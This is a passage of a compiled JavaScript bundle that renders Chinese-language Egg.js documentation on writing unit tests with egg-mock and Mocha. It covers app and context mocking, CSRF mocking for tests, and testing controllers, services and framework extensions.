\u5e76\u4e14\u8fd8\u9700\u8981\u5728\u6d4b\u8bd5\u8dd1\u5b8c\u4e4b\u540e\u505a\u4e00\u4e9b\u6e05\u7406\u5de5\u4f5c\uff0c\u5982\u5220\u9664\u4e34\u65f6\u6587\u4ef6\uff0c\u9500\u6bc1 app\u3002"),r.a.createElement("p",null,"\u5e38\u5e38\u8fd8\u6709\u6a21\u62df\u5404\u79cd\u7f51\u7edc\u5f02\u5e38\uff0c\u670d\u52a1\u8bbf\u95ee\u5f02\u5e38\u7b49\u7279\u6b8a\u60c5\u51b5\u3002"),r.a.createElement("p",null,"\u6240\u4ee5\u6211\u4eec\u5355\u72ec\u4e3a\u6846\u67b6\u62bd\u53d6\u4e86\u4e00\u4e2a\u6d4b\u8bd5 mock \u8f85\u52a9\u6a21\u5757\uff1a",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mock"},"egg-mock"),"\uff0c \u6709\u4e86\u5b83\u6211\u4eec\u5c31\u53ef\u4ee5\u975e\u5e38\u5feb\u901f\u5730\u7f16\u5199\u4e00\u4e2a app \u7684\u5355\u5143\u6d4b\u8bd5\uff0c\u5e76\u4e14\u8fd8\u80fd\u5feb\u901f\u521b\u5efa\u4e00\u4e2a ctx \u6765\u6d4b\u8bd5\u5b83\u7684\u5c5e\u6027\u3001\u65b9\u6cd5\u548c Service \u7b49\u3002"),r.a.createElement("h3",{id:"app"},r.a.createElement(l["AnchorLink"],{to:"#app","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"app"),r.a.createElement("p",null,"\u5728\u6d4b\u8bd5\u8fd0\u884c\u4e4b\u524d\uff0c\u6211\u4eec\u9996\u5148\u8981\u521b\u5efa\u5e94\u7528\u7684\u4e00\u4e2a app \u5b9e\u4f8b\uff0c \u901a\u8fc7\u5b83\u6765\u8bbf\u95ee\u9700\u8981\u88ab\u6d4b\u8bd5\u7684 Controller\u3001Middleware\u3001Service \u7b49\u5e94\u7528\u5c42\u4ee3\u7801\u3002"),r.a.createElement("p",null,"\u901a\u8fc7 egg-mock\uff0c\u7ed3\u5408 Mocha \u7684 ",r.a.createElement("code",null,"before")," \u94a9\u5b50\u5c31\u53ef\u4ee5\u4fbf\u6377\u5730\u521b\u5efa\u51fa\u4e00\u4e2a app \u5b9e\u4f8b\u3002"),r.a.createElement(o["a"],{code:"// test/controller/home.test.js\nconst assert = require('assert');\nconst mock = require('egg-mock');\n\ndescribe('test/controller/home.test.js', () => {\n  let app;\n  before(() => {\n    // \u521b\u5efa\u5f53\u524d\u5e94\u7528\u7684 app \u5b9e\u4f8b\n    app = mock.app();\n    // \u7b49\u5f85 app \u542f\u52a8\u6210\u529f\uff0c\u624d\u80fd\u6267\u884c\u6d4b\u8bd5\u7528\u4f8b\n    return app.ready();\n  });\n});",lang:"js"}),r.a.createElement("p",null,"\u8fd9\u6837\u6211\u4eec\u5c31\u62ff\u5230\u4e86\u4e00\u4e2a app \u7684\u5f15\u7528\uff0c\u63a5\u4e0b\u6765\u6240\u6709\u6d4b\u8bd5\u7528\u4f8b\u90fd\u4f1a\u57fa\u4e8e\u8fd9\u4e2a app \u8fdb\u884c\u3002 \u66f4\u591a\u5173\u4e8e\u521b\u5efa app \u7684\u4fe1\u606f\u8bf7\u67e5\u770b ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mock#options"},r.a.createElement("code",null,"mock.app(options)"))," \u6587\u6863\u3002"),r.a.createElement("p",null,"\u6bcf\u4e00\u4e2a\u6d4b\u8bd5\u6587\u4ef6\u90fd\u9700\u8981\u8fd9\u6837\u521b\u5efa\u4e00\u4e2a app \u5b9e\u4f8b\u975e\u5e38\u5197\u4f59\uff0c\u56e0\u6b64 egg-mock \u63d0\u4f9b\u4e86\u4e00\u4e2a bootstrap \u6587\u4ef6\uff0c\u53ef\u4ee5\u76f4\u63a5\u4ece\u5b83\u4e0a\u9762\u62ff\u5230\u6211\u4eec\u6240\u5e38\u7528\u7684\u5b9e\u4f8b\uff1a"),r.a.createElement(o["a"],{code:"// test/controller/home.test.js\nconst { app, mock, assert } = require('egg-mock/bootstrap');\n\ndescribe('test/controller/home.test.js', () => {\n  // test cases\n});",lang:"js"}),r.a.createElement("h3",{id:"ctx"},r.a.createElement(l["AnchorLink"],{to:"#ctx","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"ctx"),r.a.createElement("p",null,"\u6211\u4eec\u9664\u4e86 app\uff0c\u8fd8\u9700\u8981\u4e00\u79cd\u65b9\u5f0f\u4fbf\u6377\u5730\u62ff\u5230 ctx\uff0c\u65b9\u4fbf\u6211\u4eec\u8fdb\u884c Extend\u3001Service\u3001Helper \u7b49\u6d4b\u8bd5\u3002 \u800c\u6211\u4eec\u5df2\u7ecf\u901a\u8fc7\u4e0a\u9762\u7684\u65b9\u5f0f\u62ff\u5230\u4e86\u4e00\u4e2a app\uff0c\u7ed3\u5408 egg-mock \u63d0\u4f9b\u7684 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mock#appmockcontextoptions"},r.a.createElement("code",null,"app.mockContext(options)"))," \u65b9\u6cd5\u6765\u5feb\u901f\u521b\u5efa\u4e00\u4e2a ctx \u5b9e\u4f8b\u3002"),r.a.createElement(o["a"],{code:"it('should get a ctx', () => {\n  const ctx = app.mockContext();\n  assert(ctx.method === 'GET');\n  assert(ctx.url === '/');\n});",lang:"js"}),r.a.createElement("p",null,"\u5982\u679c\u6211\u4eec\u60f3\u6a21\u62df ",r.a.createElement("code",null,"ctx.user")," \u8fd9\u4e2a\u6570\u636e\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7ed9 mockContext \u4f20\u9012 data \u53c2\u6570\u5b9e\u73b0\uff1a"),r.a.createElement(o["a"],{code:"it('should mock ctx.user', () => {\n  const ctx = app.mockContext({\n    user: {\n      name: 'fengmk2',\n    },\n  });\n  assert(ctx.user);\n  assert(ctx.user.name === 'fengmk2');\n});",lang:"js"}),r.a.createElement("p",null,"\u73b0\u5728\u6211\u4eec\u62ff\u5230\u4e86 app\uff0c\u4e5f\u77e5\u9053\u5982\u4f55\u521b\u5efa\u4e00\u4e2a ctx \u4e86\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u8fdb\u884c\u66f4\u591a\u4ee3\u7801\u7684\u5355\u5143\u6d4b\u8bd5\u4e86\u3002"),r.a.createElement("h2",{id:"\u6d4b\u8bd5\u6267\u884c\u987a\u5e8f"},r.a.createElement(l["AnchorLink"],{to:"#\u6d4b\u8bd5\u6267\u884c\u987a\u5e8f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6d4b\u8bd5\u6267\u884c\u987a\u5e8f"),r.a.createElement("p",null,"\u7279\u522b\u9700\u8981\u6ce8\u610f\u7684\u662f\u6267\u884c\u987a\u5e8f\uff0c\u5c3d\u91cf\u4fdd\u8bc1\u5728\u6267\u884c\u67d0\u4e2a\u7528\u4f8b\u7684\u65f6\u5019\u6267\u884c\u76f8\u5173\u4ee3\u7801\u3002"),r.a.createElement("p",null,"\u5e38\u89c1\u7684\u9519\u8bef\u5199\u6cd5"),r.a.createElement(o["a"],{code:"// Bad\nconst { app } = require('egg-mock/bootstrap');\n\ndescribe('bad test', () => {\n  doSomethingBefore();\n\n  it('should redirect', () => {\n    return app.httpRequest().get('/').expect(302);\n  });\n});",lang:"js"}),r.a.createElement("p",null,"Mocha \u521a\u5f00\u59cb\u8fd0\u884c\u7684\u65f6\u5019\u4f1a\u8f7d\u5165\u6240\u6709\u7528\u4f8b\uff0c\u8fd9\u65f6 describe \u65b9\u6cd5\u5c31\u4f1a\u88ab\u8c03\u7528\uff0c\u90a3 ",r.a.createElement("code",null,"doSomethingBefore")," \u5c31\u4f1a\u542f\u52a8\u3002 \u5982\u679c\u5e0c\u671b\u4f7f\u7528 only \u7684\u65b9\u5f0f\u53ea\u6267\u884c\u67d0\u4e2a\u7528\u4f8b\u90a3\u6bb5\u4ee3\u7801\u8fd8\u662f\u4f1a\u88ab\u6267\u884c\uff0c\u8fd9\u662f\u975e\u9884\u671f\u7684\u3002"),r.a.createElement("p",null,"\u6b63\u786e\u7684\u505a\u6cd5\u662f\u5c06\u5176\u653e\u5230 before \u4e2d\uff0c\u53ea\u6709\u8fd0\u884c\u8fd9\u4e2a\u5957\u4ef6\u4e2d\u67d0\u4e2a\u7528\u4f8b\u624d\u4f1a\u6267\u884c\u3002"),r.a.createElement(o["a"],{code:"// Good\nconst { app } = require('egg-mock/bootstrap');\n\ndescribe('good test', () => {\n  before(() => doSomethingBefore());\n\n  it('should redirect', () => {\n    return app.httpRequest().get('/').expect(302);\n  });\n});",lang:"js"}),r.a.createElement("p",null,"Mocha \u4f7f\u7528 before/after/beforeEach/afterEach \u6765\u5904\u7406\u524d\u7f6e\u540e\u7f6e\u4efb\u52a1\uff0c\u57fa\u672c\u80fd\u5904\u7406\u6240\u6709\u95ee\u9898\u3002 \u6bcf\u4e2a\u7528\u4f8b\u4f1a\u6309 before -> beforeEach -> it -> afterEach -> after \u7684\u987a\u5e8f\u6267\u884c\uff0c\u800c\u4e14\u53ef\u4ee5\u5b9a\u4e49\u591a\u4e2a\u3002"),r.a.createElement(o["a"],{code:"describe('egg test', () => {\n  before(() => console.log('order 1'));\n  before(() => console.log('order 2'));\n  after(() => console.log('order 6'));\n  beforeEach(() => console.log('order 3'));\n  afterEach(() => console.log('order 5'));\n  it('should worker', () => console.log('order 4'));\n});",lang:"js"}),r.a.createElement("h2",{id:"\u5f02\u6b65\u6d4b\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#\u5f02\u6b65\u6d4b\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5f02\u6b65\u6d4b\u8bd5"),r.a.createElement("p",null,"egg-bin \u652f\u6301\u6d4b\u8bd5\u5f02\u6b65\u8c03\u7528\uff0c\u5b83\u652f\u6301\u591a\u79cd\u5199\u6cd5\uff1a"),r.a.createElement(o["a"],{code:"// \u4f7f\u7528\u8fd4\u56de Promise \u7684\u65b9\u5f0f\nit('should redirect', () => {\n  return app.httpRequest().get('/').expect(302);\n});\n\n// \u4f7f\u7528 callback \u7684\u65b9\u5f0f\nit('should redirect', (done) => {\n  app.httpRequest().get('/').expect(302, done);\n});\n\n// \u4f7f\u7528 async\nit('should redirect', async () => {\n  await app.httpRequest().get('/').expect(302);\n});",lang:"js"}),r.a.createElement("p",null,"\u4f7f\u7528\u54ea\u79cd\u5199\u6cd5\u53d6\u51b3\u4e8e\u4e0d\u540c\u5e94\u7528\u573a\u666f\uff0c\u5982\u679c\u9047\u5230\u591a\u4e2a\u5f02\u6b65\u53ef\u4ee5\u4f7f\u7528 async function\uff0c\u4e5f\u53ef\u4ee5\u62c6\u5206\u6210\u591a\u4e2a\u6d4b\u8bd5\u7528\u4f8b\u3002"),r.a.createElement("h2",{id:"controller-\u6d4b\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#controller-\u6d4b\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Controller \u6d4b\u8bd5"),r.a.createElement("p",null,"Controller \u5728\u6574\u4e2a\u5e94\u7528\u4ee3\u7801\u91cc\u9762\u5c5e\u4e8e\u6bd4\u8f83\u96be\u6d4b\u8bd5\u7684\u90e8\u5206\u4e86\uff0c\u56e0\u4e3a\u5b83\u8ddf router \u914d\u7f6e\u7d27\u5bc6\u76f8\u5173\uff0c \u6211\u4eec\u9700\u8981\u5229\u7528 ",r.a.createElement("code",null,"app.httpRequest()")," ",r.a.createElement(l["Link"],{to:"https://github.com/visionmedia/supertest"},"SuperTest")," \u53d1\u8d77\u4e00\u4e2a\u771f\u5b9e\u8bf7\u6c42\uff0c \u6765\u5c06 Router \u548c Controller \u8fde\u63a5\u8d77\u6765\uff0c\u5e76\u4e14\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u53d1\u9001\u5404\u79cd\u6ee1\u8db3\u8fb9\u754c\u6761\u4ef6\u7684\u8bf7\u6c42\u6570\u636e\uff0c \u4ee5\u6d4b\u8bd5 Controller \u7684\u53c2\u6570\u6821\u9a8c\u5b8c\u6574\u6027\u3002 ",r.a.createElement("code",null,"app.httpRequest()")," \u662f ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mock"},"egg-mock")," \u5c01\u88c5\u7684 ",r.a.createElement(l["Link"],{to:"https://github.com/visionmedia/supertest"},"SuperTest")," \u8bf7\u6c42\u5b9e\u4f8b\u3002"),r.a.createElement("p",null,"\u4f8b\u5982\u6211\u4eec\u8981\u7ed9 ",r.a.createElement("code",null,"app/controller/home.js"),"\uff1a"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.get('homepage', '/', controller.home.index);\n};\n\n// app/controller/home.js\nclass HomeController extends Controller {\n  async index() {\n    this.ctx.body = 'hello world';\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u5199\u4e00\u4e2a\u5b8c\u6574\u7684\u5355\u5143\u6d4b\u8bd5\uff0c\u5b83\u7684\u6d4b\u8bd5\u4ee3\u7801 ",r.a.createElement("code",null,"test/controller/home.test.js")," \u5982\u4e0b\uff1a"),r.a.createElement(o["a"],{code:"const { app, mock, assert } = require('egg-mock/bootstrap');\n\ndescribe('test/controller/home.test.js', () => {\n  describe('GET /', () => {\n    it('should status 200 and get the body', () => {\n      // \u5bf9 app \u53d1\u8d77 `GET /` \u8bf7\u6c42\n      return app\n        .httpRequest()\n        .get('/')\n        .expect(200) // \u671f\u671b\u8fd4\u56de status 200\n        .expect('hello world'); // \u671f\u671b body \u662f hello world\n    });\n\n    it('should send multi requests', async () => {\n      // \u4f7f\u7528 generator function \u65b9\u5f0f\u5199\u6d4b\u8bd5\u7528\u4f8b\uff0c\u53ef\u4ee5\u5728\u4e00\u4e2a\u7528\u4f8b\u4e2d\u4e32\u884c\u53d1\u8d77\u591a\u6b21\u8bf7\u6c42\n      await app\n        .httpRequest()\n        .get('/')\n        .expect(200) // \u671f\u671b\u8fd4\u56de status 200\n        .expect('hello world'); // \u671f\u671b body \u662f hello world\n\n      // \u518d\u8bf7\u6c42\u4e00\u6b21\n      const result = await app\n        .httpRequest()\n        .get('/')\n        .expect(200)\n        .expect('hello world');\n\n      // \u4e5f\u53ef\u4ee5\u8fd9\u6837\u9a8c\u8bc1\n      assert(result.status === 200);\n    });\n  });\n});",lang:"js"}),r.a.createElement("p",null,"\u901a\u8fc7\u57fa\u4e8e SuperTest \u7684 ",r.a.createElement("code",null,"app.httpRequest()")," \u53ef\u4ee5\u8f7b\u677e\u53d1\u8d77 GET\u3001POST\u3001PUT \u7b49 HTTP \u8bf7\u6c42\uff0c\u5e76\u4e14\u5b83\u6709\u975e\u5e38\u4e30\u5bcc\u7684\u8bf7\u6c42\u6570\u636e\u6784\u9020\u63a5\u53e3\uff0c \u4f8b\u5982\u4ee5 POST \u65b9\u5f0f\u53d1\u9001\u4e00\u4e2a JSON \u8bf7\u6c42\uff1a"),r.a.createElement(o["a"],{code:"// app/controller/home.js\nclass HomeController extends Controller {\n  async post() {\n    this.ctx.body = this.ctx.request.body;\n  }\n}\n\n// test/controller/home.test.js\nit('should status 200 and get the request body', () => {\n  // \u6a21\u62df CSRF token\uff0c\u4e0b\u6587\u4f1a\u8be6\u7ec6\u8bf4\u660e\n  app.mockCsrf();\n  return app\n    .httpRequest()\n    .post('/post')\n    .type('form')\n    .send({\n      foo: 'bar',\n    })\n    .expect(200)\n    .expect({\n      foo: 'bar',\n    });\n});",lang:"js"}),r.a.createElement("p",null,"\u66f4\u8be6\u7ec6\u7684 HTTP \u8bf7\u6c42\u6784\u9020\u65b9\u5f0f\uff0c\u8bf7\u67e5\u770b ",r.a.createElement(l["Link"],{to:"https://github.com/visionmedia/supertest#getting-started"},"SuperTest \u6587\u6863"),"\u3002"),r.a.createElement("h3",{id:"mock-csrf"},r.a.createElement(l["AnchorLink"],{to:"#mock-csrf","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"mock CSRF"),r.a.createElement("p",null,"\u6846\u67b6\u7684\u9ed8\u8ba4\u5b89\u5168\u63d2\u4ef6\u4f1a\u81ea\u52a8\u5f00\u542f ",r.a.createElement(l["AnchorLink"],{to:"./security#%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81csrf%E7%9A%84%E9%98%B2%E8%8C%83"},"CSRF \u9632\u62a4"),"\uff0c \u5982\u679c\u5b8c\u6574\u8d70 CSRF \u6821\u9a8c\u903b\u8f91\uff0c\u90a3\u4e48\u6d4b\u8bd5\u4ee3\u7801\u9700\u8981\u5148\u8bf7\u6c42\u4e00\u6b21\u9875\u9762\uff0c\u901a\u8fc7\u89e3\u6790 HTML \u62ff\u5230 CSRF token\uff0c \u7136\u540e\u518d\u4f7f\u7528\u6b64 token \u53d1\u8d77 POST \u8bf7\u6c42\u3002"),r.a.createElement("p",null,"\u6240\u4ee5 egg-mock \u5bf9 app \u589e\u52a0\u4e86 ",r.a.createElement("code",null,"app.mockCsrf()")," \u65b9\u6cd5\u6765\u6a21\u62df\u53d6 CSRF token \u7684\u8fc7\u7a0b\u3002 \u8fd9\u6837\u5728\u4f7f\u7528 SuperTest \u8bf7\u6c42 app \u5c31\u4f1a\u81ea\u52a8\u901a\u8fc7 CSRF \u6821\u9a8c\u3002"),r.a.createElement(o["a"],{code:"app.mockCsrf();\nreturn app\n  .httpRequest()\n  .post('/post')\n  .type('form')\n  .send({\n    foo: 'bar',\n  })\n  .expect(200)\n  .expect({\n    foo: 'bar',\n  });",lang:"js"}),r.a.createElement("h2",{id:"service-\u6d4b\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#service-\u6d4b\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Service \u6d4b\u8bd5"),r.a.createElement("p",null,"Service \u76f8\u5bf9\u4e8e Controller \u6765\u8bf4\uff0c\u6d4b\u8bd5\u8d77\u6765\u4f1a\u66f4\u52a0\u7b80\u5355\uff0c \u6211\u4eec\u53ea\u9700\u8981\u5148\u521b\u5efa\u4e00\u4e2a ctx\uff0c\u7136\u540e\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.service.$","{","serviceName","}")," \u62ff\u5230 Service \u5b9e\u4f8b\uff0c \u7136\u540e\u8c03\u7528 Service \u65b9\u6cd5\u5373\u53ef\u3002"),r.a.createElement("p",null,"\u4f8b\u5982"),r.a.createElement(o["a"],{code:"// app/service/user.js\nclass UserService extends Service {\n  async get(name) {\n    return await userDatabase.get(name);\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u7f16\u5199\u5355\u5143\u6d4b\u8bd5\uff1a"),r.a.createElement(o["a"],{code:"describe('get()', () => {\n  it('should get exists user', async () => {\n    // \u521b\u5efa ctx\n    const ctx = app.mockContext();\n    // \u901a\u8fc7 ctx \u8bbf\u95ee\u5230 service.user\n    const user = await ctx.service.user.get('fengmk2');\n    assert(user);\n    assert(user.name === 'fengmk2');\n  });\n\n  it('should get null when user not exists', async () => {\n    const ctx = app.mockContext();\n    const user = await ctx.service.user.get('fengmk1');\n    assert(!user);\n  });\n});",lang:"js"}),r.a.createElement("p",null,"\u5f53\u7136\uff0c\u5b9e\u9645\u7684 Service \u4ee3\u7801\u4e0d\u4f1a\u50cf\u6211\u4eec\u793a\u4f8b\u4e2d\u90a3\u4e48\u7b80\u5355\uff0c\u8fd9\u91cc\u53ea\u662f\u5c55\u793a\u5982\u4f55\u6d4b\u8bd5 Service \u800c\u5df2\u3002"),r.a.createElement("h2",{id:"extend-\u6d4b\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#extend-\u6d4b\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Extend \u6d4b\u8bd5"),r.a.createElement("p",null,"\u5e94\u7528\u53ef\u4ee5\u5bf9 Application\u3001Request\u3001Response\u3001Context \u548c Helper \u8fdb\u884c\u6269\u5c55\u3002 \u6211\u4eec\u53ef\u4ee5\u5bf9\u6269\u5c55\u7684\u65b9\u6cd5\u6216\u8005\u5c5e\u6027\u9488\u5bf9\u6027\u7684\u7f16\u5199\u5355\u5143\u6d4b\u8bd5\u3002"),r.a.createElement("h3",{id:"application"},r.a.createElement(l["AnchorLink"],{to:"#application","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Application"),r.a.createElement("p",null,"egg-mock \u521b\u5efa app \u7684\u65f6\u5019\uff0c\u5df2\u7ecf\u5c06 Application \u7684\u6269\u5c55\u81ea\u52a8\u52a0\u8f7d\u5230 app \u5b9e\u4f8b\u4e86\uff0c \u76f4\u63a5\u4f7f\u7528\u8fd9\u4e2a app \u5b9e\u4f8b\u8bbf\u95ee\u6269\u5c55\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5373\u53ef\u8fdb\u884c\u6d4b\u8bd5\u3002"),r.a.createElement("p",null,"\u4f8b\u5982 ",r.a.createElement("code",null,"app/extend/application.js"),"\uff0c\u6211\u4eec\u7ed9 app \u589e\u52a0\u4e86\u4e00\u4e2a\u57fa\u4e8e ",r.a.createElement(l["Link"],{to:"https://github.com/node-modules/ylru"},"ylru")," \u7684\u7f13\u5b58\u529f\u80fd\uff1a"),r.a.createElement(o["a"],{code:"const LRU = Symbol('Application#lru');\nconst LRUCache = require('ylru');\nmodule.exports = {\n  get lru() {\n    if (!this[LRU]) {\n      this[LRU] = new LRUCache(1000);\n    }\n    return this[LRU];\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u5bf9\u5e94\u7684\u5355\u5143\u6d4b\u8bd5\uff1a"),r.a.createElement(o["a"],{code:"describe('get lru', () => {\n  it('should get a lru and it work', () => {\n    // \u8bbe\u7f6e\u7f13\u5b58\n    app.lru.set('foo', 'bar');\n    // \u8bfb\u53d6\u7f13\u5b58\n    assert(app.lru.get('foo') === 'bar');\n  });\n});",lang:"js"}),r.a.createElement("p",null,"\u53ef\u4ee5\u770b\u5230\uff0c\u6d4b\u8bd5 Application \u7684\u6269\u5c55\u662f\u6700\u5bb9\u6613\u7684\u3002"),r.a.createElement("h3",{id:"context"},r.a.createElement(l["AnchorLink"],{to:"#context","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Context"),r.a.createElement("p",null,"Context \u6d4b\u8bd5\u53ea\u6bd4 Application \u591a\u4e86\u4e00\u4e2a ",r.a.createElement("code",null,"app.mockContext()")," \u6b65\u9aa4\u6765\u6a21\u62df\u521b\u5efa\u4e00\u4e2a Context \u5bf9\u8c61\u3002"),r.a.createElement("p",null,"\u4f8b\u5982\u5728 ",r.a.createElement("code",null,"app/extend/context.js")," \u4e2d\u589e\u52a0\u4e00\u4e2a ",r.a.createElement("code",null,"isXHR")," \u5c5e\u6027\uff0c\u5224\u65ad\u662f\u5426\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/setRequestHeader"},"XMLHttpRequest")," \u53d1\u8d77\u7684\u8bf7\u6c42\uff1a"),r.a.createElement(o["a"],{code:"module.exports = {\n  get isXHR() {\n    return this.get('X-Requested-With') === 'XMLHttpRequest';\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u5bf9\u5e94\u7684\u5355\u5143\u6d4b\u8bd5\uff1a"),r.a.createElement(o["a"],{code:"describe('isXHR()', () => {\n  it('should true', () => {\n    const ctx = app.mockContext({\n      headers: {\n        'X-Requested-With': 'XMLHttpRequest',\n      },\n    });\n    assert(ctx.isXHR === true);\n  });\n\n  it('should false', () => {\n    const ctx = app.mockContext({\n      headers: {\n        'X-Requested-With': 'SuperAgent',\n      },\n    });\n    assert(ctx.isXHR === false);\n  });\n});",lang:"js"}),r.a.createElement("h3",{id:"request"},r.a.createElement(l["AnchorLink"],{to:"#request","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Request"),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.request")," \u6765\u8bbf\u95ee Request \u6269\u5c55\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u76f4\u63a5\u5373\u53ef\u8fdb\u884c\u6d4b\u8bd5\u3002"),r.a.createElement("p",null,"\u4f8b\u5982\u5728 ",r.a.createElement("code",null,"app/extend/request.js")," \u4e2d\u589e\u52a0\u4e00\u4e2a ",r.a.createElement("code",null,"isChrome")," \u5c5e\u6027\uff0c\u5224\u65ad\u662f\u5426 Chrome \u6d4f\u89c8\u5668\u53d1\u8d77\u7684\u8bf7\u6c42\uff1a"),r.a.createElement(o["a"],{code:"const IS_CHROME = Symbol('Request#isChrome');\nmodule.exports = {\n  get isChrome() {\n    if (!this[IS_CHROME]) {\n      const ua = this.get('User-Agent').toLowerCase();\n      this[IS_CHROME] = ua.includes('chrome/');\n    }\n    return this[IS_CHROME];\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u5bf9\u5e94\u7684\u5355\u5143\u6d4b\u8bd5\uff1a"),r.a.createElement(o["a"],{code:"describe('isChrome()', () => {\n  it('should true', () => {\n    const ctx = app.mockContext({\n      headers: {\n        'User-Agent': 'Chrome/56.0.2924.51',\n      },\n    });\n    assert(ctx.request.isChrome === true);\n  });\n\n  it('should false', () => {\n    const ctx = app.mockContext({\n      headers: {\n        'User-Agent': 'FireFox/1',\n      },\n    });\n    assert(ctx.request.isChrome === false);\n  });\n});",lang:"js"}),r.a.createElement("h3",{id:"response"},r.a.createElement(l["AnchorLink"],{to:"#response","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Response"),r.a.createElement("p",null,"Response \u6d4b\u8bd5\u4e0e Request \u5b8c\u5168\u4e00\u81f4\u3002 \u901a\u8fc7 ",r.a.createElement("code",null,"ctx.response")," \u6765\u8bbf\u95ee Response \u6269\u5c55\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u76f4\u63a5\u5373\u53ef\u8fdb\u884c\u6d4b\u8bd5\u3002"),r.a.createElement("p",null,"\u4f8b\u5982\u5728 ",r.a.createElement("code",null,"app/extend/response.js")," \u4e2d\u589e\u52a0\u4e00\u4e2a ",r.a.createElement("code",null,"isSuccess")," \u5c5e\u6027\uff0c\u5224\u65ad\u5f53\u524d\u54cd\u5e94\u72b6\u6001\u7801\u662f\u5426 200\uff1a"),r.a.createElement(o["a"],{code:"module.exports = {\n  get isSuccess() {\n    return this.status === 200;\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u5bf9\u5e94\u7684\u5355\u5143\u6d4b\u8bd5\uff1a"),r.a.createElement(o["a"],{code:"describe('isSuccess()', () => {\n  it('should true', () => {\n    const ctx = app.mockContext();\n    ctx.status = 200;\n    assert(ctx.response.isSuccess === true);\n  });\n\n  it('should false', () => {\n    const ctx = app.mockContext();\n    ctx.status = 404;\n    assert(ctx.response.isSuccess === false);\n  });\n});",lang:"js"}),r.a.createElement("h3",{id:"helper"},r.a.createElement(l["AnchorLink"],{to:"#helper","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Helper"),r.a.createElement("p",null,"Helper \u6d4b\u8bd5\u65b9\u5f0f\u4e0e Service \u7c7b\u4f3c\uff0c\u4e5f\u662f\u901a\u8fc7 ctx \u6765\u8bbf\u95ee\u5230 Helper\uff0c\u7136\u540e\u8c03\u7528 Helper \u65b9\u6cd5\u6d4b\u8bd5\u3002"),r.a.createElement("p",null,"\u4f8b\u5982 ",r.a.createElement("code",null,"app/extend/helper.js")),r.a.createElement(o["a"],{code:"module.exports = {\n  money(val) {\n    const lang = this.ctx.get('Accept-Language');\n    if (lang.includes('zh-CN')) {\n      return `\uffe5 ${val}`;\n    }\n    return `$ ${val}`;\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u5bf9\u5e94\u7684\u5355\u5143\u6d4b\u8bd5\uff1a"),r.a.createElement(o["a"],{code:"describe('money()', () => {\n  it('should RMB', () => {\n    const ctx = app.mockContext({\n      // \u6a21\u62df ctx \u7684 headers\n      headers: {\n        'Accept-Language': 'zh-CN,zh;q=0.5',\n      },\n    });\n    assert(ctx.helper.money(100) === '\uffe5 100');\n  });\n\n  it('should US Dolar', () => {\n    const ctx = app.mockContext();\n    assert(ctx.helper.money(100) === '$ 100');\n  });\n});",lang:"js"}),r.a.createElement("h2",{id:"mock-\u65b9\u6cd5"},r.a.createElement(l["AnchorLink"],{to:"#mock-\u65b9\u6cd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Mock \u65b9\u6cd5"),r.a.createElement("p",null,"egg-mock \u9664\u4e86\u4e0a\u9762\u4ecb\u7ecd\u8fc7\u7684 ",r.a.createElement("code",null,"app.mockContext()")," \u548c ",r.a.createElement("code",null,"app.mockCsrf()")," \u65b9\u6cd5\u5916\uff0c\u8fd8\u63d0\u4f9b\u4e86",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mock#api"},"\u975e\u5e38\u591a\u7684 mock \u65b9\u6cd5"),"\u5e2e\u52a9\u6211\u4eec\u4fbf\u6377\u5730\u5199\u5355\u5143\u6d4b\u8bd5\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,"\u5982\u6211\u4eec\u4e0d\u60f3\u5728\u7ec8\u7aef console \u8f93\u51fa\u4efb\u4f55\u65e5\u5fd7\uff0c\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"mock.consoleLevel('NONE')")," 